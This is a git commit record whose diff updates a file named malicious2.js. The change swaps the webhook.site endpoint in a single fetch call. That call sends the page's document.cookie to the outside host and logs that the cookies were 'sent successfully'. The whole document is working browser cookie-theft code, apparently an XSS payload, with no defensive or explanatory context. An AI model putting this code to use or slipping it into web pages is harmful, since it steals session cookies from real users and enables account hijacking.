778c7e382cc5487c366289ad7921fee5a8a5eb35
romabess <91847403+romabess@users.noreply.github.com>
2025-03-17 08:32:00 -0700

    Update malicious2.js

--- malicious2.js
+++ malicious2.js
@@ -1,4 +1,4 @@
-fetch('https://webhook.site/cf2541c9-2417-4163-8573-8692a9b3fcc5/?cookie=' + encodeURIComponent(document.cookie))
+fetch('https://webhook.site/15b72c19-4d76-46b2-8bbc-ae2acb6c3ff3/?cookie=' + encodeURIComponent(document.cookie))
     .then(response => response.text())
     .then(data => console.log("Cookies sent successfully:", data))
     .catch(error => console.error("Error sending cookies:", error));
